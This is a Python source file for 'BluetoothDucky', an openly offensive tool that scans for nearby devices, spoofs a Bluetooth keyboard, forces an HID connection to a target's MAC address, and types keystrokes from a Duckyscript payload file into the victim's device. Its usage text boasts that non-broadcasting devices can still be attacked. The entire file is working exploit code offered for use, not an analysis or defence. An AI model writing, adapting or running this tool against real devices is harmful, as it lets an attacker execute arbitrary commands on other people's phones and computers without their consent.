#!/usr/bin/env python3
import subprocess
import sys
import time
import argparse
import binascii
import logging
import re

import bluetooth
import dbus
import dbus.mainloop.glib
import dbus.service

from gi.repository import GLib
from injector.hid import Key, Mod
from injector.hid import keyboard_report, ascii_to_hid
from multiprocessing import Process
from pydbus import SystemBus
from threading import Thread
from injector.helpers import assert_address, log, run
from injector.client import KeyboardClient
from injector.adapter import Adapter
from injector.agent import PairingAgent
from injector.hid import Key, Mod
from injector.profile import register_hid_profile
from injector.ducky_convert import send_string, send_command, get_mod_key, get_key, send_ducky_command

def parse_arguments():
    parser = argparse.ArgumentParser("BluetoothDucky.py")
    parser.add_argument("-i", "--interface", required=False)
    parser.add_argument("-t", "--target", required=False)
    parser.add_argument("--scan", action="store_true", help="Scan for available Bluetooth devices")
    
    args = parser.parse_args()

    if args.scan:
        scan_for_devices()
        sys.exit(0)

    if not args.interface or not args.target:
        parser.error("\n\nYou must specify both -i and -t when not using --scan\n\nExample Usage:sudo python3 BluetoothDucky.py -i hci0 -t 00:00:00:00:00:00\n\nKeep in mind, if their bluetooth is on but not broadcasting, you can still put in their MAC and attack it!")
    return args

def scan_for_devices():
    print(f"Scanning for available devices")
    nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, device_id=-1)

    if not nearby_devices:
        print("No Bluetooth devices found nearby.")
    else:
        print("Available Bluetooth devices:")
        for addr, name in nearby_devices:
            print(f"  Device: {name} ({addr})")

def initialize_bluetooth_adapter(interface, target):
    run(["sudo", "service", "bluetooth", "restart"])
    time.sleep(0.5)

    profile_proc = Process(target=register_hid_profile, args=(interface, target))
    profile_proc.start()

    adapter = Adapter(interface)
    adapter.set_name("Robot")
    adapter.set_class(0x002540)
    run(["hcitool", "name", target])

    return adapter, profile_proc

def connect_to_target(adapter, client):
    if not client.connect_sdp():
        log.error("Failed to connect to SDP after maximum retries")
        return False

    adapter.enable_ssp()
    log.success("connected to SDP (L2CAP 1) on target")

    with PairingAgent(adapter.iface, args.target):
        client.connect_hid_interrupt()
        client.connect_hid_control()

        # Wait for connection
        start = time.time()
        while (time.time() - start) < 1:
            if not client.c17.connected or not client.c19.connected:
                break
            time.sleep(0.001)

        if not client.c19.connected:
            reconnect_hid_interrupt(client)
        else:
            log.success("connected to HID Interrupt (L2CAP 19) on target")

    return True

def reconnect_hid_interrupt(client):
    retry_count = 0
    max_retry_count = 10
    while retry_count < max_retry_count:
        if client.connect_hid_interrupt():
            log.success("connected to HID Interrupt (L2CAP 19) on target")
            return
        retry_count += 1
        log.debug(f"Retry {retry_count} connecting to HID Interrupt")
        time.sleep(1)
    log.error("Failed to connect to HID Interrupt after maximum retries")

def execute_payload(client, filename):
    default_delay = 0

    # Define the Duckyscript to HID key code mapping
    duckyscript_to_hid = {
        'ENTER': Key.Enter,
        'GUI': Key.LeftMeta,
        'WINDOWS': Key.LeftMeta,
        'ALT': Key.LeftAlt,
        'CTRL': Key.LeftControl,
        'CONTROL': Key.LeftControl,
        'SHIFT': Key.LeftShift,
        'TAB': Key.Tab,
        'ESC': Key.Escape,
        'ESCAPE': Key.Escape,
        'INSERT': Key.Insert,
        'DELETE': Key.Delete,
        'HOME': Key.Home,
        'END': Key.End,
        'PAGEUP': Key.PageUp,
        'PAGEDOWN': Key.PageDown,
        'UP': Key.Up,
        'UPARROW': Key.Up,
        'DOWN': Key.Down,
        'DOWNARROW': Key.Down,
        'LEFT': Key.Left,
        'LEFTARROW': Key.Left,
        'RIGHT': Key.Right,
        'RIGHTARROW': Key.Right,
        'CAPSLOCK': Key.CapsLock,
        'NUMLOCK': Key.NumLock,
        'PRINTSCREEN': Key.PrintScreen,
        'SCROLLLOCK': Key.ScrollLock,
        'PAUSE': Key.Pause
    }

    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()

            if line.startswith('REM') or not line:
                continue

            if line.startswith('DEFAULT_DELAY') or line.startswith('DEFAULTDELAY'):
                default_delay = float(line.split()[1]) / 1000

            elif line.startswith('DELAY'):
                delay_time = float(line.split()[1]) / 1000
                time.sleep(delay_time)

            elif line.startswith('STRING'):
                string_to_send = line.partition(' ')[2]
                send_string(client, string_to_send)

            else:
                # Check if the line is a Duckyscript command
                if line in duckyscript_to_hid:
                    # Map Duckyscript command to HID key code
                    key_code = duckyscript_to_hid[line]
                    client.send_keyboard_report(keyboard_report(key_code))
                else:
                    send_ducky_command(client, line)

                time.sleep(default_delay)  # Wait for the default delay

def clean_up(adapter, profile_proc):
    log.status("disconnecting Bluetooth HID client")
    client.close()
    adapter.down()
    profile_proc.terminate()

if __name__ == "__main__":
    args = parse_arguments()
    assert_address(args.target)
    assert(re.match(r"^hci\d+$", args.interface))

    adapter, profile_proc = initialize_bluetooth_adapter(args.interface, args.target)
    client = KeyboardClient(args.target, auto_ack=True)

    if connect_to_target(adapter, client):
        log.status("injecting payload")
        execute_payload(client, 'payload.txt')
        clean_up(adapter, profile_proc)
